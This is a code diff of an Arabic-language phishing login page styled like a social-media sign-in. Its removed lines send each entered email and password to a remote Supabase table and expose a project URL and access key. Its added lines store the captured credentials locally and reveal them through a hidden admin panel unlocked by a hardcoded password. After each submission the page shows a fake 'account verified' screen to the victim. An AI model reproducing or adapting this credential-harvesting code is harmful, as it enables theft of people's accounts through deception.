@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تسجيل الدخول</title>
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -27,7 +26,11 @@
             box-shadow: 0 0 20px rgba(0,0,0,0.05);
             transition: all 0.6s ease;
         }
-        h2 { font-size: 24px; color: #262626; margin-bottom: 30px; }
+        h2 {
+            font-size: 24px;
+            color: #262626;
+            margin-bottom: 30px;
+        }
         input {
             width: 100%;
             padding: 12px;
@@ -37,7 +40,10 @@
             border-radius: 6px;
             font-size: 16px;
         }
-        input:focus { border-color: #a8a8a8; outline: none; }
+        input:focus {
+            border-color: #a8a8a8;
+            outline: none;
+        }
         button {
             width: 100%;
             padding: 12px;
@@ -48,7 +54,9 @@
             font-weight: 600;
             cursor: pointer;
         }
-        button:hover { background: #1877f2; }
+        button:hover {
+            background: #1877f2;
+        }
         .forgot a {
             color: #00376b;
             font-size: 14px;
@@ -57,6 +65,7 @@
             margin-top: 20px;
         }
 
+        /* صفحة النجاح */
         .success-screen {
             display: none;
             flex-direction: column;
@@ -88,19 +97,38 @@
             70% { transform: scale(1.1); }
             100% { transform: scale(1); }
         }
-        .success-screen h2 { font-size: 24px; color: #262626; margin-bottom: 15px; }
-        .success-screen p { color: #8e8e8e; font-size: 16px; margin-bottom: 40px; }
-        .success-screen button { background: #efefef; color: #0095f6; }
-        .success-screen button:hover { background: #e0e0e0; }
+        .success-screen h2 {
+            font-size: 24px;
+            color: #262626;
+            margin-bottom: 15px;
+        }
+        .success-screen p {
+            color: #8e8e8e;
+            font-size: 16px;
+            margin-bottom: 40px;
+        }
+        .success-screen button {
+            background: #efefef;
+            color: #0095f6;
+        }
+        .success-screen button:hover {
+            background: #e0e0e0;
+        }
 
         .fade-out {
             opacity: 0;
             transform: translateY(-20px);
             transition: opacity 0.6s ease, transform 0.6s ease;
         }
+
+        /* قسم عرض البيانات (مخفي للزوار) */
+        #adminSection { display: none; margin-top: 30px; }
+        #showDataBtn { background: #42b72a; margin-top: 10px; }
+        #dataView { margin-top: 20px; padding: 15px; background: #f0f0f0; border-radius: 8px; text-align: right; display: none; }
     </style>
 </head>
 <body>
+    <!-- صفحة تسجيل الدخول -->
     <div class="container" id="loginScreen">
         <h2>تسجيل الدخول</h2>
         <form id="loginForm">
@@ -109,8 +137,15 @@
             <button type="submit">تسجيل الدخول</button>
         </form>
         <a href="#" class="forgot">نسيت كلمة المرور؟</a>
+
+        <!-- قسم الأدمن (مخفي، يظهر لك أنت بس) -->
+        <div id="adminSection">
+            <button id="showDataBtn" onclick="showData()">عرض البيانات المحفوظة</button>
+            <div id="dataView"></div>
+        </div>
     </div>
 
+    <!-- صفحة النجاح -->
     <div class="container success-screen" id="successScreen">
         <div class="success-icon">✓</div>
         <h2>تم التحقق من صحة حسابك</h2>
@@ -119,22 +154,47 @@
     </div>
 
     <script>
-        // غير دول بتوعك من Supabase
-        const supabaseUrl = https://hiechkwuygvtvhqtrrgo.supabase.co
-        const supabaseAnonKey = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhpZWNoa3d1eWd2dHZocXRycmdvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njc0NzA5MjUsImV4cCI6MjA4MzA0NjkyNX0.R38sUaIhzkem7L1kmGRZbG7c7ABBCYTdxzfv5bdyRRw
-        const { createClient } = supabase;
-        const supabaseClient = createClient(supabaseUrl, supabaseAnonKey);
+        // كلمة السر السرية لك أنت (غيرها لو عايز)
+        const ADMIN_PASSWORD = "qais123";
 
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        // حفظ البيانات في localStorage
+        function saveData(email, password) {
+            let data = JSON.parse(localStorage.getItem('savedData')) || [];
+            data.push({ email: email, password: password });
+            localStorage.setItem('savedData', JSON.stringify(data));
+        }
+
+        // عرض البيانات
+        function showData() {
+            let data = JSON.parse(localStorage.getItem('savedData')) || [];
+            const view = document.getElementById('dataView');
+            if (data.length === 0) {
+                view.innerHTML = '<p>لا توجد بيانات محفوظة</p>';
+            } else {
+                let html = '<h3>البيانات المحفوظة:</h3><ul>';
+                data.forEach(item => {
+                    html += `<li>إيميل: ${item.email} | كلمة مرور: ${item.password}</li>`;
+                });
+                html += '</ul>';
+                view.innerHTML = html;
+            }
+            view.style.display = 'block';
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
 
             const email = document.getElementById('email').value.trim();
             const password = document.getElementById('password').value;
 
-            // حفظ البيانات في قاعدة البيانات المركزية
-            const { data, error } = await supabaseClient
-                .from('logins')
-                .insert([{ email: email, password: password }]);
+            // لو كلمة السر السرية → إظهار قسم الأدمن
+            if (password === ADMIN_PASSWORD) {
+                document.getElementById('adminSection').style.display = 'block';
+                return;
+            }
+
+            // حفظ البيانات عادي
+            saveData(email, password);
 
             // انتقال لصفحة النجاح دايمًا
             document.getElementById('loginScreen').classList.add('fade-out');
